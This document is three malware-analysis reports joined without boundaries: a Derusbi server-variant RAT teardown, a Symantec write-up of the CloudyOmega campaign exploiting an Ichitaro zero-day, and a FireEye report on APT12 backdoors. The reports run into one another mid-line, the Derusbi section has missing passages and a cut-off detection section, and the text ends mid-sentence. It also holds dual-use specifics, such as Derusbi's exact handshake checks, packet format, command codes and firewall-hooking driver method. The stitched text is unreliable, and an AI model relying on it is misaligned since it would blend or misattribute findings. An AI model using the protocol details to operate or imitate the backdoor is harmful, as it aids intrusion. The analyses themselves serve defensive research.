	
  

Derusbi  (Server  Variant)  Analysis  
Overview 
There are two types of Derusbi malware: a client-server model and a server-client model.Both 
types provide basic RAT functionality with the distinction between the two being largely the 
directionality of the communication.This report will focus on the server-client variant (or simply, 
the “server variant”) of Derusbi, which acts as a server on a victim’s machine and waits for 
commands from a controlling client.In and of itself, the Derusbi server variant is a largely unremarkable RAT when viewed from the 
perspective of functional capabilities.The server variant supports basic RAT functionality such 
as file management (uploading and downloading), network tunneling and remote command 
shell.What makes the server variant interesting is the device driver that the variant installs.The server variant utilizes a device driver in order to hook into the Windows firewall by either 
using largely undocumented Windows Firewall hooking techniques found in Windows XP and 
older or by using the documented Windows Filtering Platform found in Windows Vista and later.The driver, after hooking the firewall using either of the two mentioned interfaces, will inspect 
incoming network packets.If a specific handshake occurs between the client and the server 
variant, the remainder of the communication session for the established session will be 
redirected to the server variant.If the driver does not detect the appropriate handshake, then 
the network traffic is allowed to pass unobstructed.This allows an attacker to hide their 
communication within a cluster of network sessions originating from a single IP such as would 
be the case for a client performing multiple HTTP requests against a web server.Startup Sequence 
The server variant runs as a svchost dependent service.While the server variant binary does 
have exports related to the standard service DLL (e.g.ServiceMain, DllRegisterService, 
etc.), the startup sequence truly begins in the DllEntryPoint function.When loaded into memory via a LoadLibrary or equivalent function call, the server variant will 
determine the name of the host binary (presumably svchost.exe) as well as its own DLL’s 
name.The binary then spawns a new thread that contains the main server variant code in order 
to allow the DllEntryPoint routine to return to the calling function.Within the main server variant function (dubbed mainThread), the server variant loads a 
pointer to the API function GetCommandLineW, locates the pointer in memory to the command 
line string, and then locates the first space within the command line string and terminates the 
string by placing a NULL character at the location.The server variant then attempts to determine if it has suitable access rights within the system in 
order to operation.The check for access rights effectively checks to see if the server variant 
process is running under the NT Authority.If the check is unsuccessful, then the server 
variant terminates.With the command line patched and authority verified, the server variant sleeps for 5 seconds 
before verifying that the fShutdown flag is not set.The fShutdown flag can become set by the 

process loading the server variant calling the DllRegisterServer export.The 
DllRegisterServer function, among other tasks, will attempt to install the server variant as a 
server on the victim’s machine.Therefore, by waiting 5 seconds before continuing the 
mainThread functionality, the server variant is giving the DllRegisterServer time to 
activate and perform the necessary operations to ensure that the server variant is properly 
installed and activated as a service.The mainThread calls the mainLoop function of the server variant.The mainLoop function 
begins by loading the unique infection ID for the victim’s machine from the registry (under the 
key value located at HKLM\SOFTWARE\Microsoft\Rpc\Security).The infection ID, if 
present, must be decoded by XOR’ing each byte of the string with a static byte value (typically 
0x5F).If the infection ID does not exist within the registry, the server variant will attempt to load 
the configuration from an encoded buffer located immediately after the static string 
XXXXXXXXXXXXXXX, decode the buffer by starting at the last byte and XORing each previous 
byte by the current byte value in reverse order; the server variant will then use a specific portion 
of the configuration blob as the infection ID’s base.Next, the server variant will append a 
hyphen and a four digit value to the end of the infection ID to generate the unique infection ID 
for the victim’s machine.The newly generated infection ID is then saved to the registry location 
stated previously.The mainLoop attempts to get the privileges for SeDebugPrivilege, 
SeLoadDriverPrivilege, SeShutdownPrivilege, and SeTcbPrivilege in order to 
perform the necessary operations to load the driver portion of the server variant.The mainLoop 
will attempt to open a handle to the driver (if it is already installed) by calling CreateFile with 
the filename of \Device\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.Failing this, the 
mainLoop determines if the victim’s machine is running the 360 antivirus product by looking for 
a process with the name ZhuDongFangYu.exe.If the process is running, the driver is not 
installed but the mainLoop continues regardless.If the process is not found, however, the 
mainLoop will extract the driver binary from an encoded buffer within itself, decode the file in 
memory (using a rotating 4-byte XOR key), and install the driver on the victim’s machine as 
%SYSDIR%\Drivers\{93144EB0-8E3E-4591-B307-8EEBFE7DB28F}.sys.With the driver present (or recently installed), the mainLoop spawns another thread (dubbed 
DerusbiThread::DerusbiThread) that acts as the primary communication loop.DerusbiThread::DerusbiThread begins by generating a PCC_SOCK object.PCC_SOCK is 
an abstraction for the communication subsystem.The prototype for PCC_SOCK appears in 
Figure 1.The port number is sent to the driver (via 
IOCTL 0x220200) in order to inform the driver where to redirect incoming traffic.The “Windows 

Device Driver (Firewall Hook)” section explains the functionality of the driver in greater detail.DerusbiThread::DerusbiThread binds to the specified port and opens the port as a 
listener.At this point DerusbiThread::DerusbiThread enters an infinite loop of waiting for 
new connections to the listening socket and dispatching a new thread (dubbed CommLoop) to 
handle the traffic for the socket until fShutdown is set.At this point, the startup sequence for 
Derusbi is complete and the server variant moves into a communication and command dispatch 
phase.Windows Device Driver (Firewall Hook) 
The communication between the controlling client and the Derusbi server variant depends on 
the device driver being in place.The authors of the device driver designed the driver to work on 
Windows 2000 and later versions of the Windows operating system.Depending on the version 
of the victim’s OS, the driver will hook the Windows Firewall by either using the surprisingly 
undocumented IOCTL_IP_SET_FIREWALL_HOOK	
  command of the \\Device\IP device for 
Windows XP or older machines or by using the documented Windows Filtering Platform (WFP) 
found in Windows Vista and later.The device driver inspects incoming network traffic from any 
client connecting to the victim machine, determines if an appropriate handshake packet occurs 
at the beginning of a new TCP session, and then makes the decision to reroute the network 
traffic to the Derusbi malware or let the traffic continue unaltered to its original service.Figure 2: Device Driver Traffic Redirection 

 

Once a session has been established by means of a valid handshake, any subsequent packets 
from the client for the given TCP session will automatically be directed by the device driver to 
the Derusbi server variant.The device driver does not capture or store any network traffic 
outside of the initial handshake inspection.Communication and Command Dispatch 
The Derusbi server variant will select an available, random port between the range of 40,000 
and 45,000 on the victim’s machine upon which to listen.After selecting the port, the server 
variant will wait for incoming connections and instruct the driver to redirect appropriate TCP 
sessions to the listening port.In order to establish a valid communication channel between the server variant and a controlling 
client, a specific handshake is required.The handshake between a client and the server variant 
is well defined and consisting of 64 bytes, the data within the handshake is entirely random with 
the exception of the 3rd and 8th DWORD.The handshake begins when the client sends a 64 
byte random buffer with the 3rd (offset 12) and 8th (offset 32) DWORDs defined as: 

DWORD3 == ~DWORD0 

DWORD8 == ROR(DWORD0, 7) 

 
The server will acknowledge the handshake by sending a 64 byte random buffer with the same 
pattern for the 3rd and 8th DWORDs based on the new, randomly generated 1st DWORD (offset 
0).It is the client’s handshake that the driver for the server variant triggers off of.Some older versions of the server variant use a different set of DWORDs to validate the 
handshake, also the tests are the same.These other versions have been observed to use the 
following DWORDs: 

DWORD1 == ~DWORD0 

DWORD2 == ROR(DWORD0, 7) 

 

If the handshake fails, the server variant provides a secondary means to authenticate a client.Presumably a failsafe if the driver is unable to load, the secondary method requires the client to 
send a POST request with the following form: 

POST /forum/login.cgi HTTP/1.1\r\n 

In addition, the POST request must contain a Via field.Consisting of a 180 byte data structure (Figure 
3), the server variant provides the client with a variety of details about the victim’s machine.The 
VictimInfoPacket has an identifier of 2 (see the dwPktType explanation below).The 
communication between the server and the client at this point, and for the remainder of the 
session, is encrypted.Each datagram consists of a 24 byte header followed by an optional 
payload section.The header is not encrypted but if the optional payload is attached, the payload 
is encrypted using a DWORD XOR.The format of the header is as follows: 
 
struct PacketHeader 
{ 

DWORD dwTotalPacketSize; 
DWORD dwPktType; 
DWORD dwChecksum; 
DWORD dwEncryptionKey; 
DWORD fCompressedPayload; 
DWORD dwDecompressedSize; 

}; 
 

The dwTotalPacketSize	
  field defines the total size of the datagram including both the size of 
the header and the size of the optional payload.The	
  dwPktType	
  field correlates to the module 
ID which allows the server variant to route the datagram to the appropriate module without 
further inspection of the payload data.The	
  dwChecksum	
  value is sum of all of the bytes within 
the optional header (the field is ignored, but present, if there is no payload section).The	
  
dwEncryptionKey is the 32-bit XOR encryption key for the payload section.If the 
fCompressedPayload	
  field is non-zero, then the data within the payload is compressed using 
LZO compression (prior to XOR encoding) and the dwDecompressedSize	
  field represents the 
final size of the payload data after decompression.The payload section can have up to three 
different presentations depending on if compression is used.The first presentation is the original 
payload data as generated by the client or server, the second presentation is the LZO 
compressed form, and the final presentation (the presentation that exists going across the 
network) is the 32-bit XOR encoded data blob.Figure 4 provides a graphical representation of 
the presentation types of the payload section.Figure 4: Possible Presentations of the Payload Section of a Derusbi Server Variant's Datagram 

After sending the server information via the VictimInfoPacket, the server variant spins off a 
CommLoop thread for the connection and returns to waiting for new connections from clients to 
appear.The CommLoop thread begins by establishing the set of internal command handlers available to 
the server variant.With the exception of the administrative command handler (which is built into 
the CommLoop), each of the internal commands consists of an object derived from a base object 
PCC_BASEMOD.The malware supports up to 8 different 
modules per sample with each module designating its own ID code.Novetta has observed the 
following modules: 
ID 
Class Name 
0x81  PCC_CMD 
0x82  PCC_PROXY 
0x84  PCC_FILE 
0xF0  n/a 

Module Description 
Remote command shell 
Network tunneling 
File management 
Derusbi administrative [built-in module that does not count 
against the maximum of 8 modules per variant sample] 

 

Given the spacing in ID numbers (as noted in the gap between 0x82 and 0x84 in an otherwise 
sequential ID scheme), it is conceivable that additional modules exist.After establishing the tools, an infinite loop (CommLoop) is entered in which the server variant 
will wait for up to 1/100 of a second for input from the network; if such input arrives, the server 
routes the packet to the appropriate handler.If the network input does not arrive, the CommLoop 
queries each of the command handlers for any packets they may have queued (by calling each 
command handler’s ReadWaitingData function) and transmits the packets the handlers have 
generated.Additionally, if more than 60 seconds passes between network inputs from the client 
or network outputs from the server variant, the CommLoop will send out a beacon packet 
(dwPktType = 4).CommLoop routes packets to the appropriate command handler object by locating the 
dwPacketIdentifierCode within each of the registered command handlers that matches the 
incoming packets dwPktType.When the appropriate command handler is found, 
CommLoop passes the payload of portion of the packet to the command handler’s 
ProcessPacket function.PCC_CMD 
The PCC_CMD object contains the remote shell functionality of the server variant along with the 
ability to execute arbitrary programs.Derived from the PCC_BASEMOD class, the PCC_CMD 

class’s operations are focused largely in the ProcessPacket and ReadWaitingData 
functions.The PCC_CMD::ProcessPacket function works as a stub function that merely 
passes the packet’s payload data (pkt) data to PCC_CMD::ProcessPacketEx while ignoring 
the dwPktSize parameter.The packet’s payload data is, in and of itself, another datagram with 
a header and optional payload section.The payload of each PCC_CMD destined packet contains 
the following header: 
struct PCCCMDPacketHeader 
{ 
  DWORD dwPacketSize; 
  DWORD field_4; // purpose unknown, seemingly unused.DWORD dwCommandType; 
  DWORD dwLastError; 
}; 
 
The dwCommandType field specifies the specific PCC_CMD command that the client is 
requesting the server variant perform.There are four commands that PCC_CMD supports: 
dwCommandType 
0x04 
0x08 
0x0C 
0x10 

Functionality 
Activate the remote shell 
Execute the specified file 
Send input to remote shell 
Terminate the remote shell 

 
For each of the commands, any output from or acknowledgement of the commands comes in 
the form of another packet consisting of a PacketHeader followed by a 
PCCCMDPacketHeader and any optional payload data.The dwCommandType of the newly 
constructed packet matches the command’s original dwCommandType value (e.g.responses 
from 0x04 commands will reply with dwCommandType set to 0x04).PCC_CMD::ProcessPacketEx will queue the response packets in an internal buffer.The PCC_CMD::ReadWaitingData member function is responsible for transmitting any of the 
previously queued packets from PCC_CMD::ProcessPacketEx.If there are no queued 
packets, PCC_CMD::ReadWaitingData will perform a queue of the console output pipe for the 
remote shell process (if it is active); the function will also attempt to read the entirety of the 
waiting data, which then becomes the payload of a PacketHeader/PCCCMDPacketHeader 
based packet with the dwCommandType set to 0x0C.If the read is unsuccessful, the function 
returns a PacketHeader/PCCCMDPacketHeader based packet with the dwCommandType set 
to 0x10 indicating an error and terminating the remote shell session.PCC_FILE 
The PCC_FILE object provides a large range of file system administration functions.PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands 
should be contained within the PCC_FILE::ProcessPacket member function with some 
additional processing done in the PCC_FILE::ReadWaitingData member function.This is 
not necessarily the case, however.The PCC_FILE::ProcessPacket member function, much like PCC_CMD::ProcessPacket, 
is little more than a stub function that passes only a copy of the payload data (pkt) to 
PCC_FILE::ProcessPacketEx.PCC_FILE::ProcessPacketEx performs no file 
management operations but instead adds any incoming command packets to a queue for 
processing by PCC_FILE::ReadWaitingData if the packet is not already within the queue 
(thus avoiding duplication of commands).The PCC_FILE::ReadWaitingData member function is a stub function that calls 
PCC_FILE::ProcessQueue and returns the resulting packet from the queue processing.This 
means that file operations are surprisingly low priority, and potentially, high latency operations.Each packet that arrives within the packet queue of PCC_FILE contains a standard header 
followed by a (quasi-optional) payload data blob.The header for the PCC_FILE command 
packets takes the following form: 
struct PCCFilePacketHeader 
{ 
  DWORD dwTotalPayloadSize; 
  DWORD dwCommandType; 
}; 
 
The dwCommandType field specifies the specific PCC_FILE command that the client is 
requesting the server variant to perform.PCC_FILE supports 17 (of which 15 are unique) 
commands.While the general form within the Derusbi server variant communication model is to 
return a packet with the same dwCommandType as the original command, many of the 
PCC_FILE commands return a status packet type (dwCommandType = 0x04).It is unclear why this particular command is included 
three times in PCC_FILE.PCC_PROXY 
The PCC_PROXY object provides the platform for a tunneling network traffic to and from the 
client to a specific endpoint (or endpoints if multiple tunnels are activated by the client).Derived 
on the PCC_BASEMOD class, the PCC_PROXY class performs very little network tunneling within 
the CommLoop interactive PCC_PROXY::ProcessPacket and 
PCC_PROXY::ReadWaitingData member functions.The PCC_PROXY::ProcessPacket 
member function queues incoming PCC_PROXY packets into a received queue while 
PCC_PROXY::ReadWaitingData returns packets from a transmit queue, with the 
directionality from the perspective of the server variant.The core of the PCC_PROXY’s network 
tunneling comes from a spawned processing thread (PCC_PROXY::MainThread) that is 
generated when the PCC_PROXY object is instantiated.The PCC_PROXY::MainThread function consist an infinite loop that only terminates when the 
PCC_PROXY::fShutdown flag is set.Otherwise, the loop will inspect another internal flag 
(PCC_PROXY::fNetworkEnabled) to determine if the network tunneling is currently active.If 
the PCC_PROXY::fNetworkEnabled flag is set to false, then tunneling is disabled but 
command processing continues.It is possible to have more than one tunnel active at any given time.In order to firewall tunnels 
from each other over the backbone of the server variant’s command channel, each tunnel is 
assigned a specific channel identifier.This allows the client to specify which specific tunnel data 
is transmitted to as well as telling the client which tunnel is returning data.If the 
PCC_PROXY::fNetworkEnabled flag is set to true, PRC_PROXY::MainThread will loop 
through all active channels, perform a select on the socket connected to the endpoint and -- if 
the select indicates that there is data waiting on a particular socket -- the data is read.A new 
PCC_PROXY based packet is then generated and the packet is queued for delivery to the client.After processing each of the channels for new data, PCC_PROXY::MainThread processes 
incoming command packets from the client (an operation usually handled by the 
PCC_BASEMOD::ProcessPacket function).Packets belonging to the PCC_PROXY subsystem 
have a common header, much like the other PCC_BASEMOD derived classes.To this end, the 
PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet 
header.The PCC_PROXY supports five commands: 
dwCommandType 
0x04 
0x08 
0x0C 
0x10 
0x14 

Functionality 
Connect to Specified Endpoint (Creates New Channel) 
Send Data to Endpoint 
Terminate Channel 
Enable Network Tunneling (PCC_PROXY::fNetworkEnabled set 
to true) 
Disable Network Tunneling (PCC_PROXY::fNetworkEnabled set 
to false) 

 

 

 

 
Administrative Commands 
The administrative commands are built-in to the server variant and are not derived from the 
PCC_BASEMOD class.Each of the administrative command packets contains the same header 
structure as the PCCFilePacketHeader structure followed by an optional payload data blob.The administrative commands consist of the following five commands:   
dwCommandType 
0x08 
0x10 

Functionality 
Terminate the current network connection between the client and the 
server variant.Run the Cleanup member function of each of the registered 
PCC_BASEMOD derived objects, effectively resetting the state of each of 
the modules.Write infection ID to the registry and immediately terminate the server 
variant.Shutdown the server variant (set fShutdown to true) 
Drop a new DLL to %TEMP%\tmp1.dat, load the DLL into memory and 
call DllRegisterServer to install a new server variant binary on the 
victim’s system.0x14 
0x18 
0x1C 

 
Detection 
Given the encrypted, and potentially compressed, nature of Derusbi server variant network 
traffic, detecting the traffic on a network can be problematic using traditional IDS signatures.Operation CloudyOmega: Ichitaro zero-day and ongoing
cyberespionage campaign targeting Japan
JustSystems has issued an update to its Ichitaro product line (Japanese office suite software), plugging a
zero-day vulnerability.This vulnerability is being actively exploited in the wild to specifically target
Japanese organizations.The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file
attached, which Symantec products detect as Bloodhound.Exploit.557.Payloads from the exploit may
include Backdoor.Emdivi, Backdoor.Korplug, and Backdoor.ZXshell; however, all payloads aim to steal
confidential information from the compromised computer.The content of the emails vary depending on the business interest of the targeted recipient’s organization;
however, all are about recent political events associated with Japan.Opening the malicious attachment
with Ichitaro will drop the payload and display the document.Often such exploitation attempts crash and
then relaunch the document viewer to open a clean document in order to trick users into believing it is
legitimate.In this particular attack, opening the document and dropping the payload are done without
crashing Ichitaro and, as such, users have no visual indications as to what is really happening in the
background.CloudyOmega
As Security Response previously discussed, unpatched vulnerabilities being exploited is nothing new for
Ichitaro.However, during our investigation of this Ichitaro zero-day attack, we discovered that the attack
was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese
organizations.Symantec has named this attack campaign CloudyOmega.In this campaign, variants of
Backdoor.Emdivi are persistently used as a payload.All attacks arrive on the target computers as an
attachment to email messages.Mostly the attachments are in a simple executable format with a fake icon.However, some of the files exploit software vulnerabilities, and the aforementioned vulnerability in
Ichitaro software is only one of them.This group’s primary goal is to steal confidential information from
targeted organizations.This blog provides insights into the history of the attack campaign, infection
methods, malware payload, and the group carrying out the attacks.Timeline
The first attack of the campaign can be traced back to at least 2011.Figure 1 shows the targeted sectors
and the number of attacks carried out each year.The perpetrators were very cautious launching attacks in
the early years with attacks beginning in earnest in 2014.By far, the public sector in Japan is the most
targeted sector hit by Operation CloudyOmega.This provides some clue as to who the attack group is.Figure 1.Targeted sectors and number of attacks

Attack vector
Email is the predominant infection vector used in this campaign.Figure 2.Sample email used in attack campaign

Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day
vulnerability.The emails include password-protected .zip files containing the malware.Ironically, the
attackers follow security best practices by indicating in the first email that the password will be sent to the
recipient in a separate email.This is merely to trick the recipient into believing the email is from a
legitimate and trustworthy source.The body of the email is very short and claims the attachment includes
a medical receipt.The email also requests that the recipient open the attachment on a Windows computer.The file in the attachment has a Microsoft Word icon but, as indicated within Windows Explorer, it is an
executable file.Figure 3.Attached “document” is actually a malicious executable file

Payload
The malicious payload is Backdoor.Emdivi, a threat that opens a back door on the compromised
computer.The malware is exclusively used in the CloudyOmega attack campaign and first appeared in
2011 when it was used in an attack against a Japanese chemical company.Emdivi allows the remote
attacker executing the commands to send the results back to the command-and-control (C&C) server
through HTTP.Each Emdivi variant has a unique version number and belongs to one of two types: Type S and Type T.
The unique version number is not only a clear sign that Emdivi is systematically managed, but it also acts
as an encryption key.The malware adds extra words to the version number and then, based on this,
generates a hash, which it uses as an encryption key.Both Emdivi Type S and Type T share the following functionality:

      Allow a remote attacker to execute code through HTTP
      Steal credentials stored by Internet Explorer

Type T is primarily used in Operation CloudyOmega, has been in constant development since the
campaign was first launched in 2011, and is written in the C++ programing language.Type T employs
techniques to protect itself from security vendors or network administrators.Important parts of Type T,
such as the C&C server address it contacts and its protection mechanisms, are encrypted.Type T also
detects the presence of automatic analysis systems or debuggers, such as the following:

      VirtualMachine
      Debugger
      Sandbox

Type S, on the other hand, was used only twice in the attack campaign.Type S is a .NET application based
on the same source code and shared C&C infrastructure as Type T. However, protection mechanisms and
encryption, essential features for threat survival, are not present in Type S. One interesting trait of Type S
is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file
hash.For instance, in the example shown in Figure 4, it uses a sentence talking about the special theory of
relativity.Figure 4.Japanese text used by Emdivi Type S variant

Who is Emdivi talking to?Once infected, Emdivi connects to hardcoded C&C servers using the HTTP protocol.So far, a total of 50 unique domains have been identified from 58 Emdivi variants.Almost all websites
used as C&C servers are compromised Japanese websites ranging from sites belonging to small businesses
to personal blogs.We discovered that 40 out of the 50 compromised websites, spread across 13 IP
addresses, are hosted on a single cloud-hosting service based in Japan.Figure 5.Single IP hosts multiple compromised websites

The compromised sites are hosted on various pieces of web server software, such as Apache and Microsoft
Internet Information Services (IIS), and are on different website platforms.This indicates that the sites
were not compromised through a vulnerability in a single software product or website platform.Instead,
the attacker somehow penetrated the cloud service itself and turned the websites into C&C servers for
Backdoor.Emdivi.The compromised cloud hosting company has been notified but, at the time of writing, has not replied.Symantec offers two IPS signatures that detect and block network communication between infected
computers and the Emdivi C&C server:

      System Infected: Backdoor.Emdivi Activity
      System Infected: Backdoor.Emdivi Activity 2

Zero-day and links to other cybercriminal groups
During our research, multiple samples related to this attack campaign were identified and allowed us to
connect the dots, as it were, when it came to CloudyOmega's connections to other attack groups.In August 2012, the CloudyOmega attackers exploited the zero-day Adobe Flash Player and AIR
'copyRawDataTo()' Integer Overflow Vulnerability (CVE-2012-5054) in an attack against a high-profile
organization in Japan.The attackers sent a Microsoft Word file containing a maliciously crafted SWF file
that exploited the vulnerability.Once successfully exploited, the file installed Backdoor.Emdivi.As CVE-
2012-5054 was publicly disclosed in the same month, the attack utilized what was, at the time, a zero-day
exploit.Interestingly, the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle
attack in 2013 look very similar.Figure 6 shows the malformed SWF file executing LadyBoyle() code that attempts to exploit the Adobe
Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability (CVE-2013-0634).The Flash file
seems to have been created using the same framework used by the CloudyOmega group, but with a
different exploit.Figure 6.Malformed SWF file used in the LadyBoyle campaign in February 2013

Both attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door.No other evidence connects these two different campaigns; however, as described previously in Symantec
Security Response’s Elderwood blog, it is strongly believed that a single parent organization has broken
into a number of subgroups that each target a particular industry.In terms of the latest attack on Ichitaro, we collected a dozen samples of JTD files, all of which are exactly
the same except for their payload.The parent organization, it would seem, supplied the zero-day exploit to
the different subgroups as part of an attack toolkit and each group launched a separate attack using their
chosen malware.This is why three different payloads (Backdoor.Emdivi, Backdoor.Korplug, and
Backdoor.ZXshell) were observed in the latest zero-day attack.Figure 7.Parent group sharing zero-day exploit

Conclusion
Operation CloudyOmega was launched by an attack group that has communication channels with other
notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle.CloudyOmega
has been in operation since 2011 and is persistent in targeting Japanese organizations.With the latest
attack employing a zero-day vulnerability, there is no indication that the group will stop their activities
anytime soon.Symantec Security Response will be keeping a close eye on the CloudyOmega group.Protection summary
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible.Symantec offers the following protection against attacks associated with Operation CloudyOmega:

AV

      Backdoor.Emdivi
      Backdoor.Emdivi!gen1
      Backdoor.Emdivi!gen2
      Bloodhound.Exploit.557
      Trojan.Mdropper

IPS

      System Infected: Backdoor.Emdivi Activity
      System Infected: Backdoor.Emdivi Activity 2Darwin’s Favorite APT Group

Introduction

The attackers referred to as APT12 (also known as IXESHE, DynCalc, and DNSCALC) recently started a
new campaign targeting organizations in Japan and Taiwan.APT12 is believed to be a cyber espionage
group thought to have links to the Chinese People’s Liberation Army.APT12′s targets are consistent with
larger People’s Republic of China (PRC) goals.Intrusions and campaigns conducted by this group are in-
line with PRC goals and self-interest in Taiwan.Additionally, the new campaigns we uncovered further
highlight the correlation between APT groups ceasing and retooling operations after media exposure, as
APT12 used the same strategy after compromising the New York Times in Oct 2012.Much like Darwin’s
theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission.The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their
blog “Illuminating The Etumbot APT Backdoor.” FireEye refers to the Etumbot backdoor as RIPTIDE.Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor
that we call HIGHTIDE.This is the second time FireEye has discovered APT12 retooling after a public
disclosure.As such, FireEye believes this to be a common theme for this APT group, as APT12 will
continue to evolve in an effort to avoid detection and continue its cyber operations.FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known
as THREEBYTE and WATERSPOUT.Both backdoors were dropped from malicious documents built
utilizing the “Tran Duy Linh” exploit kit, which exploited CVE-2012-0158.These documents were also
emailed to organizations in Japan and Taiwan.While APT12 has previously used THREEBYTE, it is
unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE.Similarly,
WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been
positively identified.However, the WATERSPOUT campaign shared several traits with the RIPTIDE and
HIGHTIDE campaign that we have attributed to APT12.Background

From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor
that communicates via HTTP to a hard-coded command and control (C2) server.RIPTIDE’s first
communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to
encrypt all further communication.Figure 1: RIPTIDE HTTP GET Request Example

In June 2014, Arbor Networks published an article describing the RIPTIDE backdoor and its C2
infrastructure in great depth.The blog highlighted that the backdoor was utilized in campaigns from
March 2011 till May 2014.Following the release of the article, FireEye observed a distinct change in RIPTIDE’s protocols and strings.We suspect this change was a direct result of the Arbor blog post in order to decrease detection of
RIPTIDE by security vendors.The changes to RIPTIDE were significant enough to circumvent existing
RIPTIDE detection rules.FireEye dubbed this new malware family HIGHTIDE.HIGHTIDE Malware Family

On Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry.Attached to this email was a malicious Microsoft Word document (MD5:
f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158.It is worth noting that this
email appeared to have been sent from another Taiwanese Government employee,
implying that the email was sent from a valid but compromised account.Figure 2:  APT12 Spearphishing Email

The exploit document dropped the HIGHTIDE backdoor with the following properties:

MD5
Size
Complie
Time
Import
Hash

6e59861931fa2796ee107dc27bfdd480
75264 bytes
2014-08-23 08:22:49

ead55ef2b18a80c00786c25211981570

The HIGHTIDE backdoor connected directly to 141.108.2.157.If you compare the HTTP GET request from
the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you
can see the malware author changed the following items:

User Agent
Format and structure of the HTTP Uniform Resource Identifier (URI)

Figure 3: HIGHTIDE GET Request Example

Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word
(.doc) document that exploits CVE-2012-0158.FireEye observed APT12 deliver these exploit documents
via phishing emails in multiple cases.Based on past APT12 activity, we expect the threat group to continue
to utilize phishing as a malware delivery method.RIPTIDE and HIGHTIDE differ on several points: executable file location, image base address, the User-
Agent within the GET requests, and the format of the URI.The RIPTIDE exploit document drops its
executable file into the C:\Documents and Settings\{user}\Application Data\Location folder while the
HIGHTIDE exploit document drops its executable file into the C:\DOCUMENTS and SETTINGS\
{user}\LOCAL SETTINGS\Temp\ folder.All but one sample that we identified were written to this folder
as word.exe.The one outlier was written as winword.exe.Research into this HIGHTIDE campaign revealed APT12 targeted multiple Taiwanese Government

organizations between August 22 and 28.THREEBYTE Malware Family

On Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com
to a technology company located in Taiwan.This spear phish contained a malicious Word document that
exploited CVE-2012-0158.The MD5 of the exploit document was e009b95ff7b69cbbebc538b2c5728b11.Similar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped
a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe.This
backdoor had the following properties:

MD5
Size
Complie
Time
Import
Hash

16e627dbe730488b1c3d448bfc9096e2
75776 bytes
2014-08-25 01:22:20

dcfaa2650d29ec1bd88e262d11d3236f

This backdoor sent the following callback traffic to video[.]csmcpr[.]com:

Figure 5:  THREEBYTE GET Request Beacon

The THREEBYTE spear phishing incident (while not yet attributed) shared the following characteristics
with the above HIGHTIDE campaign attributed to APT12:

The THREEBYTE backdoor was compiled two days after the HIGHTIDE backdoors.Both the THREEBYTE and HIGHTIDE backdoors were used in attacks targeting organizations in
Taiwan.Both the THREEBYTE and HIGHTIDE backdoors were written to the same filepath of
C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe.APT12 has previously used the THREEBYTE backdoor.WATERSPOUT Malware Family

On August 25, 2014, we observed another round of spear phishing emails targeting a high-technology
company in Japan.Attached to this email was another malicious document that was designed to exploit
CVE-2012-0158.This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e
and dropped a backdoor to C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe.The backdoor had the following properties:

MD5
Size
Complie
Time
Import
Hash

f9cfda6062a8ac9e332186a7ec0e706a
49152 bytes
2014-08-25 02:10:11

864cd776c24a3c653fd89899ca32fe0b

The backdoor connects to a command and control server at icc[.]ignorelist[.]com.Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that
communicates with its C2 server.The same “Tran Duy Linh” Microsoft Word Exploit Kit was used in delivery of this backdoor.Similar Targets were observed where the threat actors utilized this backdoor.Japanese Tech Company
Taiwanese Government Organizations
Organizations in the Asia-Pacific Region that are of Interest to China

The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors:

C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe
C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\winword.exe

WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day
as the THREEBYTE backdoor.Although these points do not definitively tie WATERSPOUT to APT12, they do indicate a possible
connection between the WATERSPOUT campaign, the THREEBYTE campaign, and the HIGHTIDE
campaign attributed to APT12.Conclusion
FireEye believes the change from RIPTIDE to HIGHTIDE represents a temporary tool shift to decrease
malware detection while APT12 developed a completely new malware toolset.These development efforts
may have resulted in the emergence of the WATERSPOUT backdoor.Figure 7: Compile dates for all three malware families 

APT12’s adaptations to public disclosures lead FireEye to make several conclusions about this threat
group:

APT12 closely monitors online media related to its tools and operations and reacts when its tools are
publicly disclosed.APT12 has the ability to adapt quickly to public exposures with new tools, tactics, and procedures
(TTPs).Public disclosures may result in an immediate change in APT12’s tools.These changes may be
temporary and FireEye believes they are aimed at decreasing detection of their tools until a more
permanent and effective TTP change can be implemented (e.g., WATERSPOUT).Though public disclosures resulted in APT12 adaptations, FireEye observed only a brief pause in APT12
activity before the threat actors returned to normal activity levels.Similarly, the public disclosure of
APT12’s intrusion at the New York Times also led to only a brief pause in the threat group’s activity and
